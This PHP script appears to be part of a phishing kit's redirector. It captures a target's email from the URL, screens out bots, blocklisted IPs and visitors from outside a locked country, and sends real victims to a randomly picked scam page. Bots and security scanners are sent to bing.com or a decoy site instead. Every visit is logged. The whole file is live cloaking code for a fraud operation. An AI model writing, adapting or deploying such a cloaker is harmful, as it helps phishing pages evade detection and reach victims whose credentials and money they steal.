<?php
ini_set('display_errors', 0);
ini_set("memory_limit", -1);
error_reporting(0);

header("Cache-Control: no-store, no-cache, max-age=0");
// header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

require_once('../core/beon_core.php');
require_once('../core/short_core.php');


@$email = $_GET['email'];
//ip from visitor
$clint_code =  getCountry()['country_code'];
// random link
$link = getScama();
$linkscama = $link[array_rand($link)]['link_sc'];
// get country lock
$country_lock = getCountryLock()[0]['country'];

$origin = $_SERVER['HTTP_HOST'];

if (deviceBot() === 'NO') {
    $chek_bot_ip = ipbot()['block'];
    $chek_bot_ip = strtoupper($chek_bot_ip);
    if ($chek_bot_ip === 'NO') {
        if ($country_lock === $clint_code) {
            insertVisitor($origin, $linkscama, $chek_bot_ip, $email);
            header("Location: $linkscama", TRUE, 301);
            exit();
        } else {
            insertVisitor($origin, $linkscama, 'YES', 'Diff country');
            header("Location: https://theprofitstorm.com/", TRUE, 301);
            exit();
        }
    } else if ($chek_bot_ip === 'YES') {
        insertVisitor($origin, $linkscama, 'YES', 'email kosong');
        header("Location: https://bing.com/", TRUE, 301);
        exit();
    }
} else {
    insertVisitor($origin, $linkscama, 'YES', 'email kosong');
    header("Location: https://bing.com/?=", TRUE, 301);
    exit();
}
